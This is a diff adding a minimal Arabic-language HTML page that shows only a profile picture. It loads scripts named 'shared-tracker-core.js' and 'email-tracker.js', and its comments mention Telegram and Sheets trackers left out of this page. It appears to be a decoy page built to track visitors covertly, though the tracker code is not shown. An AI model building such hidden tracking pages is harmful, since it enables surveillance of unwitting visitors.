@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>.</title>
+<style>
+  * { margin: 0; padding: 0; }
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background: #f5f5f5;
+  }
+  .profile-img {
+    max-width: 300px;
+    border-radius: 50%;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  }
+</style>
+</head>
+<body>
+
+<img src="image2.png" class="profile-img" alt="Profile" />
+
+<!-- ✅ النواة + تتبع الإيميل فقط -->
+<script src="shared-tracker-core.js"></script>
+<script src="email-tracker.js"></script>
+
+<!-- ❌ لا نحمّل sheets-tracker.js أو telegram-tracker.js هنا -->
+
+</body>
+</html>
